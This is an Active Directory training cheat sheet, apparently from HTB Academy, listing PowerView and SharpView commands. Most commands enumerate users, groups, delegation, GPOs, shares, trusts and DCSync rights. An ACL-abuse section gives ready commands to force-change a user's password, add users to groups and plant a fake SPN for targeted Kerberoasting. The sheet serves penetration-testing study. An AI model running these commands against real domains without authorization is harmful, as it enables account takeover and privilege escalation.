{"title": "PowerView", "source": "htb-academy", "source_label": "HTB Academy", "path": "Active Directory/PowerView", "html": "<h2 id=\"quick-reference\">Quick Reference</h2>\n<p>Common PowerView commands at a glance. Import the module first:</p>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Import-Module</span> <span class=\"p\">.\\</span><span class=\"n\">PowerView</span><span class=\"p\">.</span><span class=\"n\">ps1</span>\n</code></pre></div>\n<hr />\n<h2 id=\"domain-information\">Domain Information</h2>\n<h3 id=\"get-domain-object\">Get Domain Object</h3>\n<p>Returns the AD object and details for the current domain.</p>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Get-Domain</span>\n<span class=\"nb\">Get-DomainPolicy</span>\n<span class=\"p\">(</span><span class=\"nb\">Get-DomainPolicy</span><span class=\"p\">).</span><span class=\"s2\">&quot;SystemAccess&quot;</span>\n</code></pre></div>\n<h3 id=\"list-all-ous\">List All OUs</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Get-DomainOU</span>\n</code></pre></div>\n<h3 id=\"view-domain-controllers\">View Domain Controllers</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Get-DomainController</span>\n</code></pre></div>\n<h3 id=\"view-domain-trusts\">View Domain Trusts</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Get-DomainTrust</span>\n<span class=\"nb\">Get-DomainTrustMapping</span>\n<span class=\"nb\">Get-ForestTrust</span>\n</code></pre></div>\n<hr />\n<h2 id=\"user-enumeration\">User Enumeration</h2>\n<h3 id=\"get-all-users\">Get All Users</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Get-DomainUser</span>\n<span class=\"p\">(</span><span class=\"nb\">Get-DomainUser</span><span class=\"p\">).</span><span class=\"n\">count</span>\n</code></pre></div>\n<h3 id=\"find-non-blank-description-fields\">Find Non-Blank Description Fields</h3>\n<p>Passwords are often stored in the Description field by lazy admins.</p>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Get-DomainUser</span> <span class=\"n\">-Properties</span> <span class=\"n\">samaccountname</span><span class=\"p\">,</span><span class=\"n\">description</span> <span class=\"p\">|</span> <span class=\"nb\">Where-Object</span> <span class=\"p\">{</span><span class=\"nv\">$_</span><span class=\"p\">.</span><span class=\"n\">description</span> <span class=\"o\">-ne</span> <span class=\"nv\">$null</span><span class=\"p\">}</span>\n<span class=\"nb\">Get-DomainUser</span> <span class=\"p\">*</span> <span class=\"p\">|</span> <span class=\"nb\">Select-Object</span> <span class=\"n\">samaccountname</span><span class=\"p\">,</span><span class=\"n\">description</span>\n</code></pre></div>\n<h3 id=\"find-kerberoastable-users-spn-set\">Find Kerberoastable Users (SPN Set)</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Get-DomainUser</span> <span class=\"n\">-SPN</span>\n<span class=\"nb\">Get-DomainUser</span> <span class=\"p\">*</span> <span class=\"n\">-spn</span> <span class=\"p\">|</span> <span class=\"nb\">select </span><span class=\"n\">samaccountname</span>\n<span class=\"nb\">Get-DomainUser</span> <span class=\"n\">-SPN</span> <span class=\"n\">-Properties</span> <span class=\"n\">samaccountname</span><span class=\"p\">,</span><span class=\"n\">ServicePrincipalName</span>\n</code></pre></div>\n<h3 id=\"find-asreproastable-users\">Find ASREPRoastable Users</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Get-DomainUser</span> <span class=\"n\">-KerberosPreauthNotRequired</span>\n<span class=\"nb\">Get-DomainUser</span> <span class=\"n\">-PreauthNotRequired</span> <span class=\"p\">|</span> <span class=\"nb\">select </span><span class=\"n\">samaccountname</span><span class=\"p\">,</span><span class=\"n\">userprincipalname</span><span class=\"p\">,</span><span class=\"n\">useraccountcontrol</span> <span class=\"p\">|</span> <span class=\"nb\">fl</span>\n</code></pre></div>\n<h3 id=\"find-users-with-kerberos-constrained-delegation\">Find Users with Kerberos Constrained Delegation</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Get-DomainUser</span> <span class=\"n\">-TrustedToAuth</span>\n</code></pre></div>\n<h3 id=\"find-users-with-password-not-required\">Find Users with Password Not Required</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Get-DomainUser</span> <span class=\"n\">-UACFilter</span> <span class=\"n\">PASSWD_NOTREQD</span> <span class=\"p\">|</span> <span class=\"nb\">Select-Object</span> <span class=\"n\">samaccountname</span><span class=\"p\">,</span><span class=\"n\">useraccountcontrol</span>\n</code></pre></div>\n<h3 id=\"list-all-uac-values-for-a-user\">List All UAC Values for a User</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Get-DomainUser</span> <span class=\"p\">&lt;</span><span class=\"n\">username</span><span class=\"p\">&gt;</span> <span class=\"p\">|</span> <span class=\"nb\">ConvertFrom-UACValue</span> <span class=\"n\">-showall</span>\n</code></pre></div>\n<h3 id=\"convert-username-to-sid-sid-to-username\">Convert Username to SID / SID to Username</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Convert-NameToSid</span> <span class=\"p\">&lt;</span><span class=\"n\">username</span><span class=\"p\">&gt;</span>\n<span class=\"nb\">ConvertTo-SID</span> <span class=\"p\">&lt;</span><span class=\"n\">username</span><span class=\"p\">&gt;</span>\n<span class=\"nb\">Convert-SidToName</span> <span class=\"p\">&lt;</span><span class=\"n\">SID</span><span class=\"p\">&gt;</span>\n\n<span class=\"c\"># SharpView equivalents</span>\n<span class=\"p\">.\\</span><span class=\"n\">SharpView</span><span class=\"p\">.</span><span class=\"n\">exe</span> <span class=\"nb\">ConvertTo-SID</span> <span class=\"n\">-Name</span> <span class=\"p\">&lt;</span><span class=\"n\">username</span><span class=\"p\">&gt;</span>\n<span class=\"p\">.\\</span><span class=\"n\">SharpView</span><span class=\"p\">.</span><span class=\"n\">exe</span> <span class=\"nb\">Convert-ADName</span> <span class=\"n\">-ObjectName</span> <span class=\"p\">&lt;</span><span class=\"n\">SID</span><span class=\"p\">&gt;</span>\n</code></pre></div>\n<hr />\n<h2 id=\"group-enumeration\">Group Enumeration</h2>\n<h3 id=\"list-all-groups\">List All Groups</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Get-DomainGroup</span>\n<span class=\"nb\">Get-DomainGroup</span> <span class=\"n\">-Properties</span> <span class=\"n\">Name</span>\n</code></pre></div>\n<h3 id=\"get-members-of-a-group\">Get Members of a Group</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Get-DomainGroupMember</span> <span class=\"n\">-Identity</span> <span class=\"s2\">&quot;&lt;group name&gt;&quot;</span>\n<span class=\"nb\">Get-DomainGroupMember</span> <span class=\"n\">-Identity</span> <span class=\"s2\">&quot;Domain Admins&quot;</span> <span class=\"n\">-Recurse</span>\n<span class=\"nb\">Get-DomainGroupMember</span> <span class=\"n\">-Identity</span> <span class=\"s2\">&quot;Help Desk Level 1&quot;</span> <span class=\"p\">|</span> <span class=\"nb\">Select </span><span class=\"n\">MemberName</span>\n</code></pre></div>\n<h3 id=\"find-protected-groups\">Find Protected Groups</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Get-DomainGroup</span> <span class=\"n\">-AdminCount</span>\n</code></pre></div>\n<h3 id=\"find-managed-security-groups\">Find Managed Security Groups</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Find-ManagedSecurityGroups</span>\n</code></pre></div>\n<h3 id=\"find-foreign-domain-users\">Find Foreign Domain Users</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Find-ForeignGroup</span>\n<span class=\"nb\">Get-DomainForeignUser</span>\n<span class=\"nb\">Get-DomainForeignGroupMember</span>\n</code></pre></div>\n<h3 id=\"get-group-details-including-managedby\">Get Group Details (including ManagedBy)</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Get-DomainGroup</span> <span class=\"n\">-Properties</span> <span class=\"p\">*</span> <span class=\"n\">-Identity</span> <span class=\"s1\">&#39;Citrix Admins&#39;</span> <span class=\"p\">|</span> <span class=\"nb\">select </span><span class=\"n\">cn</span><span class=\"p\">,</span><span class=\"n\">managedby</span>\n</code></pre></div>\n<hr />\n<h2 id=\"computer-enumeration\">Computer Enumeration</h2>\n<h3 id=\"get-all-domain-computers\">Get All Domain Computers</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Get-DomainComputer</span>\n<span class=\"p\">(</span><span class=\"nb\">Get-DomainComputer</span><span class=\"p\">).</span><span class=\"n\">count</span>\n</code></pre></div>\n<h3 id=\"get-computer-details\">Get Computer Details</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Get-DomainComputer</span> <span class=\"n\">-Identity</span> <span class=\"p\">&lt;</span><span class=\"n\">computer_name</span><span class=\"p\">&gt;</span> <span class=\"n\">-Properties</span> <span class=\"p\">*</span>\n</code></pre></div>\n<h3 id=\"find-computers-with-description-set\">Find Computers with Description Set</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Get-DomainComputer</span> <span class=\"n\">-Properties</span> <span class=\"n\">description</span> <span class=\"p\">|</span> <span class=\"nb\">Where-Object</span> <span class=\"p\">{</span> <span class=\"nv\">$_</span><span class=\"p\">.</span><span class=\"n\">description</span> <span class=\"o\">-match</span> <span class=\"s1\">&#39;\\w&#39;</span> <span class=\"p\">}</span>\n</code></pre></div>\n<h3 id=\"find-computers-with-unconstrained-delegation\">Find Computers with Unconstrained Delegation</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Get-DomainComputer</span> <span class=\"n\">-Unconstrained</span>\n</code></pre></div>\n<h3 id=\"find-computers-with-constrained-delegation\">Find Computers with Constrained Delegation</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Get-DomainComputer</span> <span class=\"n\">-TrustedToAuth</span>\n</code></pre></div>\n<hr />\n<h2 id=\"gpo-enumeration\">GPO Enumeration</h2>\n<h3 id=\"list-all-gpos\">List All GPOs</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Get-DomainGPO</span>\n<span class=\"nb\">Get-DomainGPO</span> <span class=\"p\">|</span> <span class=\"n\">findstr</span> <span class=\"n\">displayname</span>\n<span class=\"nb\">Get-DomainGPO</span> <span class=\"p\">|</span> <span class=\"nb\">select </span><span class=\"n\">displayname</span>\n</code></pre></div>\n<h3 id=\"get-gpo-applied-to-a-specific-host\">Get GPO Applied to a Specific Host</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Get-DomainGPO</span> <span class=\"n\">-ComputerIdentity</span> <span class=\"p\">&lt;</span><span class=\"n\">computer_name</span><span class=\"p\">&gt;</span>\n<span class=\"n\">gpresult</span> <span class=\"p\">/</span><span class=\"nb\">r </span><span class=\"p\">/</span><span class=\"n\">S</span> <span class=\"p\">&lt;</span><span class=\"n\">workstation</span><span class=\"p\">&gt;</span>\n</code></pre></div>\n<h3 id=\"find-gpo-permissions\">Find GPO Permissions</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Get-DomainGPO</span> <span class=\"p\">|</span> <span class=\"nb\">Get-ObjectAcl</span>\n</code></pre></div>\n<hr />\n<h2 id=\"share-enumeration\">Share Enumeration</h2>\n<h3 id=\"find-all-shares-on-a-host\">Find All Shares on a Host</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Get-NetShare</span> <span class=\"n\">-ComputerName</span> <span class=\"p\">&lt;</span><span class=\"n\">computer_name</span><span class=\"p\">&gt;</span>\n</code></pre></div>\n<h3 id=\"find-non-standard-shares\">Find Non-Standard Shares</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Get-NetShare</span> <span class=\"n\">-ComputerName</span> <span class=\"p\">&lt;</span><span class=\"n\">computer_name</span><span class=\"p\">&gt;</span> <span class=\"p\">|</span> <span class=\"nb\">Where-Object</span> <span class=\"p\">{</span> <span class=\"nv\">$_</span><span class=\"p\">.</span><span class=\"n\">Name</span> <span class=\"o\">-notmatch</span> <span class=\"s2\">&quot;^(ADMIN\\$|C\\$|IPC\\$)$&quot;</span> <span class=\"p\">}</span>\n</code></pre></div>\n<h3 id=\"find-reachable-domain-shares\">Find Reachable Domain Shares</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Find-DomainShare</span>\n<span class=\"nb\">Find-InterestingDomainShareFile</span>\n</code></pre></div>\n<h3 id=\"get-acls-on-a-share-path\">Get ACLs on a Share Path</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Get-PathAcl</span> <span class=\"s2\">&quot;\\\\&lt;sql-server&gt;\\DB_backups&quot;</span>\n</code></pre></div>\n<h3 id=\"get-file-servers\">Get File Servers</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Get-DomainFileServer</span>\n<span class=\"nb\">Get-DomainDFSShare</span>\n</code></pre></div>\n<hr />\n<h2 id=\"local-group-enumeration\">Local Group Enumeration</h2>\n<h3 id=\"get-local-groups-on-a-host\">Get Local Groups on a Host</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Get-NetLocalGroup</span> <span class=\"n\">-ComputerName</span> <span class=\"p\">&lt;</span><span class=\"n\">workstation</span><span class=\"p\">&gt;</span>\n<span class=\"nb\">Get-NetLocalGroupMember</span> <span class=\"n\">-ComputerName</span> <span class=\"p\">&lt;</span><span class=\"n\">workstation</span><span class=\"p\">&gt;</span>\n</code></pre></div>\n<h3 id=\"test-local-admin-access\">Test Local Admin Access</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Test-AdminAccess</span> <span class=\"n\">-ComputerName</span> <span class=\"p\">&lt;</span><span class=\"n\">sql-server</span><span class=\"p\">&gt;</span>\n</code></pre></div>\n<h3 id=\"find-machines-where-users-are-logged-in\">Find Machines Where Users Are Logged In</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Find-DomainUserLocation</span>\n</code></pre></div>\n<h3 id=\"find-machines-where-current-user-has-local-admin\">Find Machines Where Current User Has Local Admin</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Find-LocalAdminAccess</span>\n</code></pre></div>\n<hr />\n<h2 id=\"acl-enumeration-and-abuse\">ACL Enumeration and Abuse</h2>\n<h3 id=\"find-interesting-acls-non-built-in-objects\">Find Interesting ACLs (Non-Built-In Objects)</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Find-InterestingDomainAcl</span>\n</code></pre></div>\n<h3 id=\"get-acls-for-a-specific-user\">Get ACLs for a Specific User</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Get-DomainObjectAcl</span> <span class=\"n\">-Identity</span> <span class=\"p\">&lt;</span><span class=\"n\">username</span><span class=\"p\">&gt;</span>\n<span class=\"nv\">$sid</span> <span class=\"p\">=</span> <span class=\"nb\">Convert-NameToSid</span> <span class=\"p\">&lt;</span><span class=\"n\">username</span><span class=\"p\">&gt;</span>\n<span class=\"nb\">Get-DomainObjectACL</span> <span class=\"n\">-Identity</span> <span class=\"p\">*</span> <span class=\"p\">|</span> <span class=\"p\">?</span> <span class=\"p\">{</span><span class=\"nv\">$_</span><span class=\"p\">.</span><span class=\"n\">SecurityIdentifier</span> <span class=\"o\">-eq</span> <span class=\"nv\">$sid</span><span class=\"p\">}</span>\n<span class=\"nb\">Get-DomainObjectACL</span> <span class=\"n\">-ResolveGUIDs</span> <span class=\"n\">-Identity</span> <span class=\"p\">*</span> <span class=\"p\">|</span> <span class=\"p\">?</span> <span class=\"p\">{</span><span class=\"nv\">$_</span><span class=\"p\">.</span><span class=\"n\">SecurityIdentifier</span> <span class=\"o\">-eq</span> <span class=\"nv\">$sid</span><span class=\"p\">}</span>\n</code></pre></div>\n<h3 id=\"find-dcsync-rights\">Find DCSync Rights</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nv\">$dcsync</span> <span class=\"p\">=</span> <span class=\"nb\">Get-ObjectACL</span> <span class=\"s2\">&quot;DC=&lt;domain&gt;,DC=local&quot;</span> <span class=\"n\">-ResolveGUIDs</span> <span class=\"p\">|</span> <span class=\"p\">?</span> <span class=\"p\">{</span> <span class=\"p\">(</span><span class=\"nv\">$_</span><span class=\"p\">.</span><span class=\"n\">ActiveDirectoryRights</span> <span class=\"o\">-match</span> <span class=\"s1\">&#39;GenericAll&#39;</span><span class=\"p\">)</span> <span class=\"o\">-or</span> <span class=\"p\">(</span><span class=\"nv\">$_</span><span class=\"p\">.</span><span class=\"n\">ObjectAceType</span> <span class=\"o\">-match</span> <span class=\"s1\">&#39;Replication-Get&#39;</span><span class=\"p\">)}</span> <span class=\"p\">|</span> <span class=\"nb\">Select-Object</span> <span class=\"n\">-ExpandProperty</span> <span class=\"n\">SecurityIdentifier</span> <span class=\"p\">|</span> <span class=\"nb\">Select </span><span class=\"n\">-ExpandProperty</span> <span class=\"n\">value</span>\n<span class=\"nb\">Convert-SidToName</span> <span class=\"nv\">$dcsync</span>\n</code></pre></div>\n<h3 id=\"get-acls-on-a-specific-user-generic\">Get ACLs on a Specific User (generic)</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"p\">(</span><span class=\"nb\">Get-ACL</span> <span class=\"s2\">&quot;AD:</span><span class=\"p\">$((</span><span class=\"nb\">Get-ADUser</span> <span class=\"p\">&lt;</span><span class=\"n\">username</span><span class=\"p\">&gt;).</span><span class=\"n\">distinguishedname</span><span class=\"p\">)</span><span class=\"s2\">&quot;</span><span class=\"p\">).</span><span class=\"n\">Access</span> <span class=\"p\">|</span> <span class=\"nb\">Where-Object</span> <span class=\"p\">{</span> <span class=\"nv\">$_</span><span class=\"p\">.</span><span class=\"n\">ActiveDirectoryRights</span> <span class=\"o\">-match</span> <span class=\"s2\">&quot;GenericAll&quot;</span> <span class=\"p\">}</span>\n</code></pre></div>\n<hr />\n<h2 id=\"acl-abuse\">ACL Abuse</h2>\n<h3 id=\"change-a-users-password-via-forcechangepassword-right\">Change a User's Password via ForceChangePassword Right</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nv\">$SecPassword</span> <span class=\"p\">=</span> <span class=\"nb\">ConvertTo-SecureString</span> <span class=\"s1\">&#39;&lt;password&gt;&#39;</span> <span class=\"n\">-AsPlainText</span> <span class=\"n\">-Force</span>\n<span class=\"nv\">$Cred</span> <span class=\"p\">=</span> <span class=\"nb\">New-Object</span> <span class=\"n\">System</span><span class=\"p\">.</span><span class=\"n\">Management</span><span class=\"p\">.</span><span class=\"n\">Automation</span><span class=\"p\">.</span><span class=\"n\">PSCredential</span><span class=\"p\">(</span><span class=\"s1\">&#39;&lt;DOMAIN&gt;\\&lt;username&gt;&#39;</span><span class=\"p\">,</span> <span class=\"nv\">$SecPassword</span><span class=\"p\">)</span>\n<span class=\"nv\">$targetPassword</span> <span class=\"p\">=</span> <span class=\"nb\">ConvertTo-SecureString</span> <span class=\"s1\">&#39;&lt;new-password&gt;&#39;</span> <span class=\"n\">-AsPlainText</span> <span class=\"n\">-Force</span>\n<span class=\"nb\">Set-DomainUserPassword</span> <span class=\"n\">-Identity</span> <span class=\"p\">&lt;</span><span class=\"n\">target-username</span><span class=\"p\">&gt;</span> <span class=\"n\">-AccountPassword</span> <span class=\"nv\">$targetPassword</span> <span class=\"n\">-Credential</span> <span class=\"nv\">$Cred</span> <span class=\"n\">-Verbose</span>\n</code></pre></div>\n<h3 id=\"add-user-to-group\">Add User to Group</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Add-DomainGroupMember</span> <span class=\"n\">-Identity</span> <span class=\"s1\">&#39;Help Desk Level 1&#39;</span> <span class=\"n\">-Members</span> <span class=\"s1\">&#39;&lt;target-username&gt;&#39;</span> <span class=\"n\">-Credential</span> <span class=\"nv\">$Cred2</span> <span class=\"n\">-Verbose</span>\n</code></pre></div>\n<h3 id=\"remove-user-from-group-cleanup\">Remove User from Group (Cleanup)</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Remove-DomainGroupMember</span> <span class=\"n\">-Identity</span> <span class=\"s2\">&quot;Help Desk Level 1&quot;</span> <span class=\"n\">-Members</span> <span class=\"s1\">&#39;&lt;target-username&gt;&#39;</span> <span class=\"n\">-Credential</span> <span class=\"nv\">$Cred2</span> <span class=\"n\">-Verbose</span>\n</code></pre></div>\n<h3 id=\"set-fake-spn-on-a-user-targeted-kerberoast\">Set Fake SPN on a User (Targeted Kerberoast)</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Set-DomainObject</span> <span class=\"n\">-Credential</span> <span class=\"nv\">$Cred2</span> <span class=\"n\">-Identity</span> <span class=\"p\">&lt;</span><span class=\"n\">username</span><span class=\"p\">&gt;</span> <span class=\"n\">-SET</span> <span class=\"p\">@{</span><span class=\"n\">serviceprincipalname</span><span class=\"p\">=</span><span class=\"s1\">&#39;notahacker/LEGIT&#39;</span><span class=\"p\">}</span> <span class=\"n\">-Verbose</span>\n</code></pre></div>\n<h3 id=\"clear-fake-spn-cleanup\">Clear Fake SPN (Cleanup)</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Set-DomainObject</span> <span class=\"n\">-Credential</span> <span class=\"nv\">$Cred2</span> <span class=\"n\">-Identity</span> <span class=\"p\">&lt;</span><span class=\"n\">username</span><span class=\"p\">&gt;</span> <span class=\"n\">-Clear</span> <span class=\"n\">serviceprincipalname</span> <span class=\"n\">-Verbose</span>\n</code></pre></div>\n<hr />\n<h2 id=\"trust-enumeration\">Trust Enumeration</h2>\n<h3 id=\"get-domain-sid\">Get Domain SID</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Get-DomainSID</span>\n</code></pre></div>\n<h3 id=\"get-enterprise-admins-group-sid\">Get Enterprise Admins Group SID</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Get-DomainGroup</span> <span class=\"n\">-Domain</span> <span class=\"p\">&lt;</span><span class=\"n\">DOMAIN</span><span class=\"p\">&gt;</span> <span class=\"n\">-Identity</span> <span class=\"s2\">&quot;Enterprise Admins&quot;</span> <span class=\"p\">|</span> <span class=\"nb\">select </span><span class=\"n\">distinguishedname</span><span class=\"p\">,</span><span class=\"n\">objectsid</span>\n</code></pre></div>\n<h3 id=\"enumerate-users-in-child-domain\">Enumerate Users in Child Domain</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Get-DomainUser</span> <span class=\"n\">-Domain</span> <span class=\"p\">&lt;</span><span class=\"n\">child-domain</span><span class=\"p\">&gt;</span> <span class=\"p\">|</span> <span class=\"nb\">select </span><span class=\"n\">SamAccountName</span>\n</code></pre></div>\n<h3 id=\"enumerate-foreign-spns-cross-forest-kerberoast\">Enumerate Foreign SPNs (Cross-Forest Kerberoast)</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Get-DomainUser</span> <span class=\"n\">-SPN</span> <span class=\"n\">-Domain</span> <span class=\"p\">&lt;</span><span class=\"n\">external-domain</span><span class=\"p\">&gt;</span> <span class=\"p\">|</span> <span class=\"nb\">select </span><span class=\"n\">SamAccountName</span>\n<span class=\"nb\">Get-DomainUser</span> <span class=\"n\">-Domain</span> <span class=\"p\">&lt;</span><span class=\"n\">external-domain</span><span class=\"p\">&gt;</span> <span class=\"n\">-Identity</span> <span class=\"n\">mssqlsvc</span> <span class=\"p\">|</span> <span class=\"nb\">select </span><span class=\"n\">samaccountname</span><span class=\"p\">,</span><span class=\"n\">memberof</span>\n<span class=\"nb\">Get-DomainForeignGroupMember</span> <span class=\"n\">-Domain</span> <span class=\"p\">&lt;</span><span class=\"n\">external-domain</span><span class=\"p\">&gt;</span>\n</code></pre></div>\n<h3 id=\"export-powerview-results-to-csv\">Export PowerView Results to CSV</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Export-PowerViewCSV</span>\n</code></pre></div>\n<hr />\n<h2 id=\"sharpview-examples\">SharpView Examples</h2>\n<p>SharpView is a .NET port of PowerView, useful when PowerShell is restricted.</p>\n<div class=\"highlight\"><pre><span></span><code><span class=\"p\">.\\</span><span class=\"n\">SharpView</span><span class=\"p\">.</span><span class=\"n\">exe</span> <span class=\"nb\">Get-Domain</span>\n<span class=\"p\">.\\</span><span class=\"n\">SharpView</span><span class=\"p\">.</span><span class=\"n\">exe</span> <span class=\"nb\">Get-DomainOU</span>\n<span class=\"p\">.\\</span><span class=\"n\">SharpView</span><span class=\"p\">.</span><span class=\"n\">exe</span> <span class=\"nb\">Get-DomainUser</span> <span class=\"n\">-KerberosPreauthNotRequired</span>\n<span class=\"p\">.\\</span><span class=\"n\">SharpView</span><span class=\"p\">.</span><span class=\"n\">exe</span> <span class=\"nb\">Get-DomainGPO</span> <span class=\"p\">|</span> <span class=\"n\">findstr</span> <span class=\"n\">displayname</span>\n<span class=\"p\">.\\</span><span class=\"n\">SharpView</span><span class=\"p\">.</span><span class=\"n\">exe</span> <span class=\"nb\">Get-NetShare</span> <span class=\"n\">-ComputerName</span> <span class=\"p\">&lt;</span><span class=\"n\">sql-server</span><span class=\"p\">&gt;</span>\n<span class=\"p\">.\\</span><span class=\"n\">SharpView</span><span class=\"p\">.</span><span class=\"n\">exe</span> <span class=\"nb\">Get-DomainGroupMember</span> <span class=\"n\">-Identity</span> <span class=\"s1\">&#39;Help Desk&#39;</span>\n<span class=\"p\">.\\</span><span class=\"n\">SharpView</span><span class=\"p\">.</span><span class=\"n\">exe</span> <span class=\"nb\">Get-DomainGroup</span> <span class=\"n\">-AdminCount</span>\n<span class=\"p\">.\\</span><span class=\"n\">SharpView</span><span class=\"p\">.</span><span class=\"n\">exe</span> <span class=\"nb\">Find-ManagedSecurityGroups</span>\n<span class=\"p\">.\\</span><span class=\"n\">SharpView</span><span class=\"p\">.</span><span class=\"n\">exe</span> <span class=\"nb\">Get-NetLocalGroupMember</span> <span class=\"n\">-ComputerName</span> <span class=\"p\">&lt;</span><span class=\"n\">workstation</span><span class=\"p\">&gt;</span>\n<span class=\"p\">.\\</span><span class=\"n\">SharpView</span><span class=\"p\">.</span><span class=\"n\">exe</span> <span class=\"nb\">Get-DomainComputer</span> <span class=\"n\">-Unconstrained</span>\n<span class=\"p\">.\\</span><span class=\"n\">SharpView</span><span class=\"p\">.</span><span class=\"n\">exe</span> <span class=\"nb\">Get-DomainUser</span> <span class=\"n\">-SPN</span>\n<span class=\"p\">.\\</span><span class=\"n\">SharpView</span><span class=\"p\">.</span><span class=\"n\">exe</span> <span class=\"nb\">Get-DomainUser</span> <span class=\"n\">-Help</span>\n</code></pre></div>", "excerpt": "Quick Reference Common PowerView commands at a glance. Import the module first: Import-Module .\\ PowerView . ps1 Domain Information Get Domain Object Returns the AD object and details for the current ", "tags": []}